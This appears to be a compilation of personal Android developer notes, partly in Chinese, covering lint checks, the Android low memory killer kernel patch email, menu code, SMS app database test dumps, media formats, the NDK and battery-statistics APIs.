"IconExpectedSize": Ensures that launcher icons, notification icons etc have
      the correct size
"IconLocation": Ensures that images are not defined in the density-independent
      drawable folder
"IconDuplicates": Finds duplicated icons under different names
"IconDuplicatesConfig": Finds icons that have identical bitmaps across various
      configuration parameters
"IconNoDpi": Finds icons that appear in both a -nodpi folder and a dpi folder
"IconExtension": Checks that the icon file extension matches the actual image
      format in the file
"IconColors": Checks that icons follow the recommended visual style
"IconXmlAndPng": Finds icons that appear both as a drawable .xml file and as
      bitmaps
"IconLauncherShape": Checks that launcher icons follow the recommended visual
      style
"TypographyDashes": Looks for usages of hyphens which can be replaced by n
      dash and m dash characters
"TypographyQuotes": Looks for straight quotes which can be replaced by curvy
      quotes
"TypographyFractions": Looks for fraction strings which can be replaced with a
      fraction character
"TypographyEllipsis": Looks for ellipsis strings (...) which can be replaced
      with an ellipsis character
"TypographyOther": Looks for miscellaneous typographical problems like
      replacing (c) with ©
"ButtonOrder": Ensures the dismissive action of a dialog is on the left and
      affirmative on the right
"ButtonCase": Ensures that Cancel/OK dialog buttons use the canonical
      capitalization
"BackButton": Looks for Back buttons, which are not common on the Android
      platform.
"ButtonStyle": Ensures that buttons in button bars are borderless
"MissingPrefix": Detect XML attributes not using the Android namespace
"Overdraw": Looks for overdraw issues (where a view is painted only to be
      fully painted over)
"StringFormatInvalid": Checks that format strings are valid
"StringFormatCount": Ensures that all format strings are used and that the
      same number is defined across translations
"StringFormatMatches": Ensures that the format used in <string> definitions is
      compatible with the String.format call
"Typos": Looks for typos in messages
"WrongViewCast": Looks for incorrect casts to views that according to the XML
      are of a different type
"SuspiciousImport": Checks for 'import android.R' statements, which are
      usually accidental
"WrongFolder": Finds resource files that are placed in the wrong folders
"ViewConstructor": Checks that custom views define the expected constructors
"LibraryCustomView": Flags custom attributes in libraries, which must use the
      res-auto-namespace instead
"UnusedNamespace": Finds unused namespaces in XML documents
"NamespaceTypo": Looks for misspellings in namespace declarations
"AlwaysShowAction": Checks for uses of showAsAction="always" and suggests
      showAsAction="ifRoom" instead
"MenuTitle": Ensures that all menu items supply a title
"ResourceAsColor": Looks for calls to setColor where a resource id is passed
      instead of a resolved color
"DrawAllocation": Looks for memory allocations within drawing code
"UseValueOf": Looks for usages of "new" for wrapper classes which should use
      "valueOf" instead
"UseSparseArrays": Looks for opportunities to replace HashMaps with the more
      efficient SparseArray
"Wakelock": Looks for problems with wakelock usage
"Recycle": Looks for missing recycle() calls on resources
"CommitTransaction": Looks for missing commit() calls on FragmentTransactions
"SetJavaScriptEnabled": Looks for invocations of
      android.webkit.WebSettings.setJavaScriptEnabled
"ShowToast": Looks for code creating a Toast but forgetting to call show() on
      it
"CommitPrefEdits": Looks for code editing a SharedPreference but forgetting to
      call commit() on it
"CutPasteId": Looks for code cut & paste mistakes in findViewById() calls
"UnlocalizedSms": Looks for code sending text messages to unlocalized phone
      numbers
"PackagedPrivateKey": Looks for packaged private key files
"LocalSuppress": Looks for @SuppressLint annotations in locations where it
      doesn't work for class based checks
"ProtectedPermissions": Looks for permissions that are only granted to system
      apps
"RequiredSize": Ensures that the layout_width and layout_height are specified
      for all views
"WrongCall": Finds cases where the wrong call is made, such as calling
      onMeasure instead of measure
```
# DOCS
```
Usage: lint [flags] <project directories>
Flags:
--help                   This message.
--help <topic>           Help on the given topic, such as "suppress".
--list                   List the available issue id's and exit.
--version                Output version information and exit.
--exitcode               Set the exit code to 1 if errors are found.
--show                   List available issues along with full explanations.
--show <ids>             Show full explanations for the given list of issue
                         id's.
Enabled Checks:
--disable <list>         Disable the list of categories or specific issue
                         id's. The list should be a comma-separated list of
                         issue id's or categories.
--enable <list>          Enable the specific list of issues. This checks all
                         the default issues plus the specifically enabled
                         issues. The list should be a comma-separated list of
                         issue id's or categories.
--check <list>           Only check the specific list of issues. This will
                         disable everything and re-enable the given list of
                         issues. The list should be a comma-separated list of
                         issue id's or categories.
-w, --nowarn             Only check for errors (ignore warnings)
-Wall                    Check all warnings, including those off by default
-Werror                  Treat all warnings as errors
--config <filename>      Use the given configuration file to determine whether
                         issues are enabled or disabled. If a project contains
                         a lint.xml file, then this config file will be used
                         as a fallback.
Output Options:
--quiet                  Don't show progress.
--fullpath               Use full paths in the error output.
--showall                Do not truncate long messages, lists of alternate
                         locations, etc.
--nolines                Do not include the source file lines with errors in
                         the output. By default, the error output includes
                         snippets of source code on the line containing the
                         error, but this flag turns it off.
--html <filename>        Create an HTML report instead. If the filename is a
                         directory (or a new filename without an extension),
                         lint will create a separate report for each scanned
                         project.
--url filepath=url       Add links to HTML report, replacing local path
                         prefixes with url prefix. The mapping can be a
                         comma-separated list of path prefixes to
                         corresponding URL prefixes, such as
                         C:	empProj1=http://buildserver/sources/temp/Proj1. 
                         To turn off linking to files, use --url none
--simplehtml <filename>  Create a simple HTML report
--xml <filename>         Create an XML report instead.
Project Options:
--resources <dir>        Add the given folder (or path) as a resource
                         directory for the project. Only valid when running
                         lint on a single project.
--sources <dir>          Add the given folder (or path) as a source directory
                         for the project. Only valid when running lint on a
                         single project.
--classpath <dir>        Add the given folder (or jar file, or path) as a
                         class directory for the project. Only valid when
                         running lint on a single project.
--libraries <dir>        Add the given folder (or jar file, or path) as a
                         class library for the project. Only valid when
                         running lint on a single project.
Exit Status:
0                        Success.
1                        Lint errors detected.
2                        Lint usage.
3                        Cannot clobber existing file.
4                        Lint help.
5                        Invalid command-line argument.
```
http://android.amberfog.com/?p=296
# 内存管理
```
  1 The lowmemorykiller driver lets user-space specify a set of memory thresholds
  2 where processes with a range of oom_adj values will get killed. Specify the
  3 minimum oom_adj values in /sys/module/lowmemorykiller/parameters/adj and the
  4 number of free pages in /sys/module/lowmemorykiller/parameters/minfree. Both
  5 files take a comma separated list of numbers in ascending order.
  6 
  7 For example, write "0,8" to /sys/module/lowmemorykiller/parameters/adj and
  8 "1024,4096" to /sys/module/lowmemorykiller/parameters/minfree to kill processes
  9 with a oom_adj value of 8 or higher when the free memory drops below 4096 pages
 10 and kill processes with a oom_adj value of 0 or higher when the free memory
 11 drops below 1024 pages.
 12 
 13 The driver considers memory used for caches to be free, but if a large
 14 percentage of the cached memory is locked this can be very inaccurate
 15 and processes may not get killed until the normal oom killer is triggered.
```
```
Date	Mon, 19 Dec 2011 06:53:28 +0400
From	Anton Vorontsov <>
Subject	Android low memory killer vs. memory pressure notifications
Hello everyone,
Some background: Android apps never exit, instead they just save state
and become inactive, and only get killed when memory usage hits a
specific threshold. This strategy greatly improves user experience,
as "start-up" time becomes non-issue. There are several application
categories and for each category there is its own limit (e.g. background
vs. foreground app -- we never want to kill foreground tasks, but that's
details).
So, Android developers came with a Lowmemory killer driver, it receives
memory pressure notifications, and then kills appropriate tasks when
memory resources become low.
Some time ago there were a lot of discussions regarding this driver,
and it seems that people see different ways of how this should be
implemented.
Today I'd like to resurrect the discussion, and eventually come to a
solution (or, if there is a group of people already working on this,
please let me know -- I'd readily help with anything I could).
The last time the two main approaches were spoken out, which both assume
that kernel should not be responsible for killing tasks:
- Use memory controller cgroup (CGROUP_MEM_RES_CTLR) notifications from
  the kernel side, plus userland "manager" that would kill applications.
  The main downside of this approach is that mem_cg needs 20 bytes per
  page (on a 32 bit machine). So on a 32 bit machine with 4K pages
  that's approx. 0.5% of RAM, or, in other words, 5MB on a 1GB machine.
  0.5% doesn't sound too bad, but 5MB does, quite a little bit. So,
  mem_cg feels like an overkill for this simple task (see the driver at
  the very bottom).
- Use some new low memory notifications mechanism from the kernel side +
  userland manager that would react to the notifications and would kill
  the tasks.
  The main downside of this approach is that the new mechanism does
  not exist. :-) "Big iron" people happily use mem_cg notifications,
  and things like /dev/mem_notify died circa 2008 as there was too
  little interest in it. See http://lkml.org/lkml/2009/1/20/404
(There were also suggestions to integrate lowmemory killer functionality
into OOM killer, but I see little point in doing this as the OOM
killer and lowmemory killer have different "triggers": OOM killer is
a quite simple last-resort thing for the kernel, it is called from
the kernel allocators' fail paths, and, IIRC, it is even synchronous w/
GFP_NOFAIL. I don't think that there could be any code or ABI reuse.)
So, the main difference between current Android lowmemory killer and
the approaches above is that the "killer" function suggested to be
factored out to the userland code. This makes sense as it is userland
that is categorizing tasks-to-kill (in the current lowmemory killer
driver via controlling OOM adj value).
Personally I'd start thinking about the new [lightweight] notification
stuff, i.e. something without mem_cg's downsides. Though, I'm Cc'ing
Android folks so maybe they could enlighten us why in-kernel "lowmemory
manager" might be a better idea. Plus Cc'ing folks that I think might
be interested in this discussion.
Thanks!
p.s.
I'm inlining the android memory killer code down below, just for the
reference. It is quite small (and useful... though, currently only for
Android case).
- - - -
From: Arve Hjønnevåg <arve@android.com>
Subject: Android low memory killer driver
The lowmemorykiller driver lets user-space specify a set of memory thresholds
where processes with a range of oom_adj values will get killed. Specify the
minimum oom_adj values in /sys/module/lowmemorykiller/parameters/adj and the
number of free pages in /sys/module/lowmemorykiller/parameters/minfree. Both
files take a comma separated list of numbers in ascending order.
For example, write "0,8" to /sys/module/lowmemorykiller/parameters/adj and
"1024,4096" to /sys/module/lowmemorykiller/parameters/minfree to kill processes
with a oom_adj value of 8 or higher when the free memory drops below 4096 pages
and kill processes with a oom_adj value of 0 or higher when the free memory
drops below 1024 pages.
The driver considers memory used for caches to be free, but if a large
percentage of the cached memory is locked this can be very inaccurate
and processes may not get killed until the normal oom killer is triggered.
---
 mm/Kconfig           |    7 ++
 mm/Makefile          |    1 +
 mm/lowmemorykiller.c |  175 ++++++++++++++++++++++++++++++++++++++++++++++++++
 3 files changed, 183 insertions(+), 0 deletions(-)
 create mode 100644 mm/lowmemorykiller.c
diff --git a/mm/Kconfig b/mm/Kconfig
index 011b110..a2e7959 100644
--- a/mm/Kconfig
+++ b/mm/Kconfig
@@ -259,6 +259,12 @@ config DEFAULT_MMAP_MIN_ADDR
 	  This value can be changed after boot using the
 	  /proc/sys/vm/mmap_min_addr tunable.
 
+config LOW_MEMORY_KILLER
+	bool "Low Memory Killer"
+	help
+	  The lowmemorykiller driver lets user-space specify a set of memory
+	  thresholds where processes will get killed.
+
 config ARCH_SUPPORTS_MEMORY_FAILURE
 	bool
 
diff --git a/mm/Makefile b/mm/Makefile
index 50ec00e..10fb4ff 100644
--- a/mm/Makefile
+++ b/mm/Makefile
@@ -47,6 +47,7 @@ obj-$(CONFIG_QUICKLIST) += quicklist.o
 obj-$(CONFIG_TRANSPARENT_HUGEPAGE) += huge_memory.o
 obj-$(CONFIG_CGROUP_MEM_RES_CTLR) += memcontrol.o page_cgroup.o
 obj-$(CONFIG_MEMORY_FAILURE) += memory-failure.o
+obj-$(CONFIG_LOW_MEMORY_KILLER)	+= lowmemorykiller.o
 obj-$(CONFIG_HWPOISON_INJECT) += hwpoison-inject.o
 obj-$(CONFIG_DEBUG_KMEMLEAK) += kmemleak.o
 obj-$(CONFIG_DEBUG_KMEMLEAK_TEST) += kmemleak-test.o
diff --git a/mm/lowmemorykiller.c b/mm/lowmemorykiller.c
new file mode 100644
index 0000000..4e51936
--- /dev/null
+++ b/mm/lowmemorykiller.c
@@ -0,0 +1,175 @@
+/*
+ * The lowmemorykiller driver lets user-space specify a set of memory thresholds
+ * where processes with a range of oom_adj values will get killed. Specify the
+ * minimum oom_adj values in /sys/module/lowmemorykiller/parameters/adj and the
+ * number of free pages in /sys/module/lowmemorykiller/parameters/minfree. Both
+ * files take a comma separated list of numbers in ascending order.
+ *
+ * For example, write "0,8" to /sys/module/lowmemorykiller/parameters/adj and
+ * "1024,4096" to /sys/module/lowmemorykiller/parameters/minfree to kill processes
+ * with a oom_adj value of 8 or higher when the free memory drops below 4096 pages
+ * and kill processes with a oom_adj value of 0 or higher when the free memory
+ * drops below 1024 pages.
+ *
+ * The driver considers memory used for caches to be free, but if a large
+ * percentage of the cached memory is locked this can be very inaccurate
+ * and processes may not get killed until the normal oom killer is triggered.
+ *
+ * Copyright (C) 2007-2008 Google, Inc.
+ *
+ * This software is licensed under the terms of the GNU General Public
+ * License version 2, as published by the Free Software Foundation, and
+ * may be copied, distributed, and modified under those terms.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ */
+
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/mm.h>
+#include <linux/oom.h>
+#include <linux/sched.h>
+#include <linux/notifier.h>
+
+static uint32_t lowmem_debug_level = 2;
+static int lowmem_adj[6] = {
+	0,
+	1,
+	6,
+	12,
+};
+static int lowmem_adj_size = 4;
+static size_t lowmem_minfree[6] = {
+	3 * 512,	/* 6MB */
+	2 * 1024,	/* 8MB */
+	4 * 1024,	/* 16MB */
+	16 * 1024,	/* 64MB */
+};
+static int lowmem_minfree_size = 4;
+
+#define lowmem_print(level, x...)			\
+	do {						\
+		if (lowmem_debug_level >= (level))	\
+			printk(x);			\
+	} while (0)
+
+static int lowmem_shrink(struct shrinker *s, struct shrink_control *sc)
+{
+	struct task_struct *p;
+	struct task_struct *selected = NULL;
+	int rem = 0;
+	int tasksize;
+	int i;
+	int min_adj = OOM_ADJUST_MAX + 1;
+	int selected_tasksize = 0;
+	int selected_oom_adj;
+	int array_size = ARRAY_SIZE(lowmem_adj);
+	int other_free = global_page_state(NR_FREE_PAGES);
+	int other_file = global_page_state(NR_FILE_PAGES) -
+						global_page_state(NR_SHMEM);
+
+	if (lowmem_adj_size < array_size)
+		array_size = lowmem_adj_size;
+	if (lowmem_minfree_size < array_size)
+		array_size = lowmem_minfree_size;
+	for (i = 0; i < array_size; i++) {
+		if (other_free < lowmem_minfree[i] &&
+		    other_file < lowmem_minfree[i]) {
+			min_adj = lowmem_adj[i];
+			break;
+		}
+	}
+	if (sc->nr_to_scan > 0)
+		lowmem_print(3, "lowmem_shrink %lu, %x, ofree %d %d, ma %d
",
+			     sc->nr_to_scan, sc->gfp_mask, other_free, other_file,
+			     min_adj);
+	rem = global_page_state(NR_ACTIVE_ANON) +
+		global_page_state(NR_ACTIVE_FILE) +
+		global_page_state(NR_INACTIVE_ANON) +
+		global_page_state(NR_INACTIVE_FILE);
+	if (sc->nr_to_scan <= 0 || min_adj == OOM_ADJUST_MAX + 1) {
+		lowmem_print(5, "lowmem_shrink %lu, %x, return %d
",
+			     sc->nr_to_scan, sc->gfp_mask, rem);
+		return rem;
+	}
+	selected_oom_adj = min_adj;
+
+	read_lock(&tasklist_lock);
+	for_each_process(p) {
+		struct mm_struct *mm;
+		struct signal_struct *sig;
+		int oom_adj;
+
+		task_lock(p);
+		mm = p->mm;
+		sig = p->signal;
+		if (!mm || !sig) {
+			task_unlock(p);
+			continue;
+		}
+		oom_adj = sig->oom_adj;
+		if (oom_adj < min_adj) {
+			task_unlock(p);
+			continue;
+		}
+		tasksize = get_mm_rss(mm);
+		task_unlock(p);
+		if (tasksize <= 0)
+			continue;
+		if (selected) {
+			if (oom_adj < selected_oom_adj)
+				continue;
+			if (oom_adj == selected_oom_adj &&
+			    tasksize <= selected_tasksize)
+				continue;
+		}
+		selected = p;
+		selected_tasksize = tasksize;
+		selected_oom_adj = oom_adj;
+		lowmem_print(2, "select %d (%s), adj %d, size %d, to kill
",
+			     p->pid, p->comm, oom_adj, tasksize);
+	}
+	if (selected) {
+		lowmem_print(1, "send sigkill to %d (%s), adj %d, size %d
",
+			     selected->pid, selected->comm,
+			     selected_oom_adj, selected_tasksize);
+		force_sig(SIGKILL, selected);
+		rem -= selected_tasksize;
+	}
+	lowmem_print(4, "lowmem_shrink %lu, %x, return %d
",
+		     sc->nr_to_scan, sc->gfp_mask, rem);
+	read_unlock(&tasklist_lock);
+	return rem;
+}
+
+static struct shrinker lowmem_shrinker = {
+	.shrink = lowmem_shrink,
+	.seeks = DEFAULT_SEEKS * 16
+};
+
+static int __init lowmem_init(void)
+{
+	register_shrinker(&lowmem_shrinker);
+	return 0;
+}
+
+static void __exit lowmem_exit(void)
+{
+	unregister_shrinker(&lowmem_shrinker);
+}
+
+module_param_named(cost, lowmem_shrinker.seeks, int, S_IRUGO | S_IWUSR);
+module_param_array_named(adj, lowmem_adj, int, &lowmem_adj_size,
+			 S_IRUGO | S_IWUSR);
+module_param_array_named(minfree, lowmem_minfree, uint, &lowmem_minfree_size,
+			 S_IRUGO | S_IWUSR);
+module_param_named(debug_level, lowmem_debug_level, uint, S_IRUGO | S_IWUSR);
+
+module_init(lowmem_init);
+module_exit(lowmem_exit);
+
+MODULE_LICENSE("GPL");
-- 
1.7.7.3
--
To unsubscribe from this list: send the line "unsubscribe linux-kernel" in
the body of a message to majordomo@vger.kernel.org
More majordomo info at  http://vger.kernel.org/majordomo-info.html
Please read the FAQ at  http://www.tux.org/lkml/
```
# Menu
# 在xml中定义Menu
# 1. 定义
```xml
<?xml version="1.0"?>
<menu xmlns:android="http://schemas.android.com/apk/res/android">
    <!-- This group uses the default category. -->
    <group android:id="@+id/menuGroup_Main">
        <item android:id="@+id/menu_testPick" android:orderInCategory="5" android:title="Test Pick"/>
        <item android:id="@+id/menu_testGetContent" android:orderInCategory="5" android:title="Test Get Content"/>
        <item android:id="@+id/menu_clear" android:orderInCategory="10" android:title="clear"/>
        <item android:id="@+id/menu_dial" android:orderInCategory="7" android:title="dial"/>
        <item android:id="@+id/menu_test" android:orderInCategory="4" android:title="@+string/test"/>
        <item android:id="@+id/menu_show_browser" android:orderInCategory="5" android:title="show browser"/>
    </group>
</menu>
```
# 2. 加载
```
@Override
public boolean onCreateOptionsMenu(Menu menu)
{
MenuInflater inflater = getMenuInflater(); //from activity
inflater.inflate(R.menu.my_menu, menu);
//It is important to return true to see the menu
return true;
}
```
# 3. 事件处理
```
private void onOptionsItemSelected (MenuItem item)
{
if (item.getItemId() == R.id.menu_clear)
{
//do something
}
else if (item.getItemId() == R.id.menu_dial)
{
//do something
}
......etc
}
```
从3.0开始， item属性可以直接设置android:onClick属性。
# 4.0+ 的Popup菜单
PopupMenu可以通过审议的UI事件调出。比如点击按钮。
1. 在xml中定义Menu，如上所示，并无差异
2. 加载
```java
private void showPopupMenu() {
    //Get hold of a view to anchor the popup
    //getTextView() can be any method that returns a view
    TextView tv = getTextView();
    //instantiate a popup menu
    //the var "this" stands for activity
    PopupMenu popup = new PopupMenu(this, tv);
    //the following code for 3.0 sdk
    //popup.getMenuInflater().inflate(
    //
    // R.menu.popup_menu, popup.getMenu());
    //Or in sdk 4.0
    popup.inflate(R.menu.popup_menu);
    popup.setOnMenuItemClickListener(new PopupMenu.OnMenuItemClickListener() {
            public boolean onMenuItemClick(MenuItem item)
            {
                //some local method to log that item
                //See the sample project to see how this method works
                appendMenuItemText(item);
                return true;
            }
        });
    popup.show();
}
```
 * PopupMenu需要指定一个anchor View。
# android:icon : 指定图标
# android:visible: 显示隐藏
# android:alphabeticShortcut: 快捷键
# TABLE: addr ==
# TABLE: pdu ==
# TABLE: threads ==
||_id||date||message_count||recipient_ids||snippet||snippet_cs||read||type||error||has_attachment||
||1||1337570249927||3||1||reply 2||0||1||0||0||0||
||2||1337570237171||3||2||reply 4||0||1||0||0||0||
||3||1337570280000||1||3||message 5 (unread)||0||0||0||0||0||
||4||1337570337000||1||4||This is draft ||0||1||0||0||0||
# TABLE: android_metadata ==
||locale||
||en_US||
# TABLE: pending_msgs ==
# TABLE: words ==
||_id||index_text||source_id||table_to_use||
||1||message 1||1||1||
||2||message 2||2||1||
||3||message 3||3||1||
||4||message 4||4||1||
||5||reply 4||5||1||
||6||reply 2||6||1||
||7||message 5 (unread)||7||1||
||8||This is msg to 8888||8||1||
||9||This is draft ||9||1||
# TABLE: attachments ==
# TABLE: rate ==
# TABLE: words_content ==
||docid||c0_id||c1index_text||c2source_id||c3table_to_use||
||1||1||message 1||1||1||
||2||2||message 2||2||1||
||3||3||message 3||3||1||
||4||4||message 4||4||1||
||5||5||reply 4||5||1||
||6||6||reply 2||6||1||
||7||7||message 5 (unread)||7||1||
||8||8||This is msg to 8888||8||1||
||9||9||This is draft ||9||1||
# TABLE: canonical_addresses ==
||_id||address||
||1||1983||
||2||1900||
||3||2000||
||4||8888||
# TABLE: raw ==
# TABLE: words_segdir ==
||level||idx||start_block||leaves_end_block||end_block||root||
||1||0||0||0||0||||
||0||0||0||0||0||||
||0||1||0||0||0||||
||0||2||0||0||0||||
||0||3||0||0||0||||
||0||4||0||0||0||||
||0||5||0||0||0||||
# TABLE: drm ==
# TABLE: sms ==
||_id||thread_id||address||person||date||protocol||read||status||type||reply_path_present||subject||body||service_center||locked||error_code||seen||
||1||1||1983|| ||1337570177247||0||1||-1||1||0|| ||message 1||||0||0||1||
||2||1||1983|| ||1337570190220||0||1||-1||1||0|| ||message 2||||0||0||1||
||3||2||1900|| ||1337570208936||0||1||-1||1||0|| ||message 3||||0||0||1||
||4||2||1900|| ||1337570212836||0||1||-1||1||0|| ||message 4||||0||0||1||
||5||2||1900|| ||1337570237171||||1||-1||2|| || ||reply 4||||0||0||1||
||6||1||1983|| ||1337570249927||||1||-1||2|| || ||reply 2||||0||0||1||
||7||3||2000|| ||1337570280505||0||0||-1||1||0||||message 5 (unread)|| ||0||0||1||
||8||4||8888|| ||1337570309626||||1||-1||2|| || ||This is msg to 8888|| ||0||0||1||
||9||4|| || ||1337570337615||||1||-1||3|| || ||This is draft ||||0||0||0||
# TABLE: words_segments ==
# TABLE: part ==
# TABLE: sr_pending ==
视频格式:
|| Video || 视频容器类型 ||
|| H.263 || 3GPP(.3gp) MPEG-4 (.mp4) ||
|| H.264 AVC || 3GPP(.3gp) MPEG-4 (.mp4) ||
|| MPEG-4 SP || 3GPP (.3gp) ||
Video Encoding Recommendations:
||                  ||SD (Low quality)       || SD (High quality)	     || HD (Not available on all devices)
|| 视频编码    ||H.264 Baseline Profile ||	H.264 Baseline Profile	 || H.264 Baseline Profile
|| 视频分辨率 ||176 x 144 px	         || 480 x 360 px	         || 1280 x 720 px
|| 视频帧频	 ||12 fps	             || 30 fps	                 || 30 fps
|| 视频比特率  ||56 Kbps	             || 500 Kbps	             || 2 Mbps
|| 音频编码	    ||AAC-LC	             || AAC-LC	                 || AAC-LC
|| 音频通道	||1 (mono)	             || 2 (stereo)	             || 2 (stereo)
|| 音频比特率  ||24 Kbps	             || 128 Kbps	             || 192 Kbps
# 收藏功能
 
# 参考
 * http://developer.android.com/guide/appendix/media-formats.html
5.1.2 后台内容管理
 * 内容数据包采用zip格式, 将所需全部内容打包成一个文件，方便维护更新.
# Android Ndk
Getting Started with the NDK
Once you've installed the NDK successfully, take a few minutes to read the documentation included in the NDK. You can find the documentation in the <ndk>/docs/ directory. In particular, please read the OVERVIEW.HTML document completely, so that you understand the intent of the NDK and how to use it.
If you used a previous version of the NDK, take a moment to review the list of NDK changes in the CHANGES.HTML document.
Here's the general outline of how you work with the NDK tools:
 1. Place your native sources under <project>/jni/...
 2. Create <project>/jni/Android.mk to describe your native sources to the NDK build system
 3. Optional: Create <project>/jni/Application.mk.
 4. Build your native code by running the 'ndk-build' script from your project's directory. It is located in the top-level NDK directory:
```sh
$ cd <project>
$ <ndk>/ndk-build
```
The build tools copy the stripped, shared libraries needed by your application to the proper location in the application's project directory.
Finally, compile your application using the SDK tools in the usual way. The SDK build tools will package the shared libraries in the application's deployable .apk file.
# 参考
 * [http://developer.android.com/sdk/ndk/overview.html#samples 何为NDK]
 * [http://developer.android.com/sdk/ndk/index.html Google官方文档]
# Android Permission =
# TABLE: android_metadata ==
||locale||
||en_US||
# TABLE: pansi_msg_bean ==
||_id||type||mime_type||address||date||thread_id||read||seen||text_body||download_url||title_text||send_status||
||1||1||com.pansi.msg.item/chat||PANSI_ADDR:pansi_msg_bean_addr||1337579155386||5||0||0||Hi, I am your personal assistant from Pansi.||
||I'm bringing you the best texting experiences.||
||I can help you to: ||
||  1. Get the information about the Pansi product updates.||
||  2. Seek help from Pansi Studio||
||  3. Push your suggestions to Pansi Studio.||
||The message between you and me goes through internet, with no extra SMS charge.||||||1||
# TABLE: recent_contact ==
||_id||count||address||
||1||1||1900||
||2||1||1983||
||3||1||8888||
# TABLE: thread_summary ==
||_id||thread_id||thread_type||mime_type||date||address||message_count||recipient_ids||snippet||snippet_cs||read||error||data||has_attachment||
||1||1||2||com.pansi.msg.thread/mms_sms||1337570249927||||3||1||reply 2||0||1||0||||0||
||2||2||2||com.pansi.msg.thread/mms_sms||1337570237171||||3||2||reply 4||0||1||0||||0||
||3||3||2||com.pansi.msg.thread/mms_sms||1337570280000||||1||3||message 5 (unread)||0||1||0||||0||
||4||4||2||com.pansi.msg.thread/mms_sms||1337570337000||||1||4||This is draft ||0||1||0||||0||
||5||0||1||com.pansi.msg.thread/pansi||1337579155386||PANSI_ADDR:pansi_msg_bean_addr||1||||Hi, I am your personal assistant from Pansi.||
||I'm bringing you the best texting experiences.||
||I can help you to: ||
||  1. Get the information about the Pansi product updates.||
||  2. Seek help from Pansi Studio||
||  3. Push your suggestions to Pansi Studio.||
||The message between you and me goes through internet, with no extra SMS charge.||0||0||0||||0||
# TABLE: labels ==
||_id||name||type||
||1||inbox||1||
||2||outbox||1||
||3||sent_box||1||
||4||draft_box||1||
# TABLE: pansi_msg_contact ==
||_id||address||name||
||1||PANSI_ADDR:pansi_msg_bean_addr||Pansi Assistant||
# TABLE: sms_draft ==
||_id||address||body||date||mime_type||
||1||2000||Draft from existed ||1337579653756||com.pansi.msg.item/sms_draft||
||2||1900||New draft to 1900 ||1337579689626||com.pansi.msg.item/sms_draft||
# TABLE: time_message ==
# TABLE: message_summary ==
||_id||mid||type||label_id||date||thread_id||read||locked||sr_stat||dr_stat||rr_stat||sub_cs||mms_type||msg_box||subject||text_body||address||att_type||complex||mime_type||img_id||seen||name||
||1||1||1||1||1337570177247||1||1||0||128||-1||0||||||1||||message 1||1983||||0||com.pansi.msg.item/sms||||1||1983||
||2||2||1||1||1337570190220||1||1||0||128||-1||0||||||1||||message 2||1983||||0||com.pansi.msg.item/sms||||1||1983||
||3||3||1||1||1337570208936||2||1||0||128||-1||0||||||1||||message 3||1900||||0||com.pansi.msg.item/sms||||1||1900||
||4||4||1||1||1337570212836||2||1||0||128||-1||0||||||1||||message 4||1900||||0||com.pansi.msg.item/sms||||1||1900||
||5||5||1||3||1337570237171||2||1||0||131||-1||0||||||2||||reply 4||1900||||0||com.pansi.msg.item/sms||||1||1900||
||6||6||1||3||1337570249927||1||1||0||131||-1||0||||||2||||reply 2||1983||||0||com.pansi.msg.item/sms||||1||1983||
||7||7||1||1||1337570280505||3||1||0||128||-1||0||||||1||||message 5 (unread)||2000||||0||com.pansi.msg.item/sms||||1||2000||
||8||8||1||3||1337570309626||4||1||0||131||-1||0||||||2||||This is msg to 8888||8888||||0||com.pansi.msg.item/sms||||1||8888||
||9||1||4||1||1337579155386||5||0||0||0||0||0||0||0||1||||Hi, I am your personal assistant from Pansi.||
||I'm bringing you the best texting experiences.||
||I can help you to: ||
||  1. Get the information about the Pansi product updates.||
||  2. Seek help from Pansi Studio||
||  3. Push your suggestions to Pansi Studio.||
||The message between you and me goes through internet, with no extra SMS charge.||PANSI_ADDR:pansi_msg_bean_addr||0||0||com.pansi.msg.item/chat||0||1||Pansi Assistant||
||10||1||5||4||1337579653756||0||1||0||0||0||0||0||0||0||||Draft from existed ||2000||0||0||com.pansi.msg.item/sms_draft||0||0||||
||11||2||5||4||1337579689626||0||1||0||0||0||0||0||0||0||||New draft to 1900 ||1900||0||0||com.pansi.msg.item/sms_draft||0||0||||
# TABLE: phrase ==
||_id||content||hit_times||
||1||Where are you?||0||
||2||Hi, what's up?||0||
||3||Please call me.||0||
||4||On the way. Will be there soon.||0||
||5||Got it.||0||
||6||Wish you the best!||0||
||7||Sorry in a meeting. Will call you back later.||0||
||8||Thank you.||0||
||9||You are welcome.||0||
||10||I'm fine. Don't worry.||0||
||11||Ok. See you then!||0||
||12||I can't answer right now, please call me later or email me, thanks!||0||
# TABLE: template ==
[[TOC]]
# Android Power Management
本文基于Android2.1/2.2(APILevel 7,8)介绍了如何使用Android电源管理API计算各种设备以及应用程序对电池的消耗情况。
文中提到电源管理相关的API不包含在发布的Android SDK 中，属于未公开API, 2.2(APILevel > 8)之后可能会有变化。
# 1. 设备耗电量计算公式
设备耗电量=单位时间内设备耗电 X 时间
这个公式想说明的是，为了计算某个设备的耗电量，比如显示器，你必须知道两点:
显示器亮了多久
显示器单位时间消耗多少电池
借助Android系统提供的API可以得到以上信息，下面来详细讨论。
# 1.1 电池使用统计信息(时间)
电池使用状态记载了自开机以来到指定查询时间为止, 各种设备的使用时间。
查询时需要指定参数如下:
电池信息统计类型(默认为:BatteryStats.STATS_UNPLUGGED)
查询时间， 需要根据: (1. 电池信息统计类型) 和 系统当前时间 查询得到。
# 1.1.1 得到统计时间点
来看个例子:
```java
//1. 电池信息统计类型
int    type      = BatteryStats.STATS_UNPLUGGED;
// 系统当前时间
long   uSecTime  = SystemClock.elapsedRealtime() * 1000;
// 电池使用统计信息
BatteryStatsImpl status    = PowerUtils.getBatteryStatus();
// 2. 得到查询时间
long             now       = status.computeBatteryRealtime(uSecTime,type);
```
# 1.1.2 得到设备的运行时间
鼓捣了半天，我们其实是得到了一个统计时间，然后就可以查询这个统时间点上各种设备的使用时间(听起来像病句-_-!):
简单的以WiFi设备为例:
```java
long wifiRunningTime       = status.getWifiRunningTime(now, type)
```
复杂的以Screen设备为例:
```java
// 很多设备运行在不同状态下的单位时间耗电量是不一样的，例如显示器在不同亮度下
// 的单位时间耗电量肯定是有差异的，你必须将这些因素计算在内，所以过程稍显复杂
for (int i = 0; i < BatteryStats.NUM_SCREEN_BRIGHTNESS_BINS; i++) {
    status.getScreenBrightnessTime(i, now, type)
}
```
# 1.2 Power Profile (单位时间内设备耗电)
